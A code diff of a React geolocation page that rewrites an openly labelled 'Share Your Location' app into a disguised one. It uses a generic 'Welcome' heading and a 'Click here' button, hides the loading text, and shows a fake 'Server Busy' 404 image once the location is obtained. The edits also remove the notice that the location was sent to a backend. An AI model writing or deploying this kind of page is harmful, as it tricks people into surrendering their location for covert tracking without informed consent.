@@ -110,7 +110,7 @@
   // }
 
 
-  import React, { useState } from "react";
+import React, { useState } from "react";
 
 export default function App() {
   const [coords, setCoords] = useState(null);
@@ -176,8 +176,8 @@ export default function App() {
     `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
 
   return (
-    <div style={{ padding: 20 }}>
-      <h2>Share Your Location</h2>
+    <div style={{ padding: 20 , textAlign: "center", marginLeft: "auto", marginRight: "auto" }}>
+      <h2>Welcome</h2>
 
       {!coords && !loading && !error && (
         <button
@@ -192,11 +192,11 @@ export default function App() {
             fontSize: "16px",
           }}
         >
-          Share My Location
+          Click here
         </button>
       )}
 
-      {loading && <p>Requesting your location...</p>}
+      {loading && <p>......</p>}
 
       {error && (
         <p style={{ color: "red", marginTop: 10 }}>
@@ -204,37 +204,33 @@ export default function App() {
         </p>
       )}
 
-      {coords && (
-        <div style={{ marginTop: 20 }}>
-          <p><strong>Latitude:</strong> {coords.latitude}</p>
-          <p><strong>Longitude:</strong> {coords.longitude}</p>
-          <p><strong>Accuracy:</strong> {coords.accuracy} meters</p>
+     {coords && (
+  <div
+    style={{
+      position: "fixed",
+      top: 0,
+      left: 0,
+      width: "100vw",
+      height: "100vh",
+      display: "flex",
+      justifyContent: "center",
+      alignItems: "center",
+      backgroundColor: "#fff",
+      zIndex: 9999,
+    }}
+  >
+    <img
+      src="/404.png"   // <-- your image here
+      alt="Please try again with the link, Server Busy"
+      style={{
+        maxWidth: "100%",
+        maxHeight: "100%",
+        objectFit: "contain",
+      }}
+    />
+  </div>
+)}
 
-          <a
-            href={googleMapsUrl}
-            target="_blank"
-            rel="noopener noreferrer"
-            style={{
-              display: "inline-block",
-              padding: "10px 15px",
-              marginTop: "10px",
-              background: "#34A853",
-              color: "white",
-              borderRadius: "5px",
-              textDecoration: "none",
-              fontWeight: "bold",
-            }}
-          >
-            Open in Google Maps
-          </a>
-
-          {sent && (
-            <p style={{ color: "green", marginTop: 10 }}>
-              ✔ Location sent to backend successfully.
-            </p>
-          )}
-        </div>
-      )}
     </div>
   );
 }
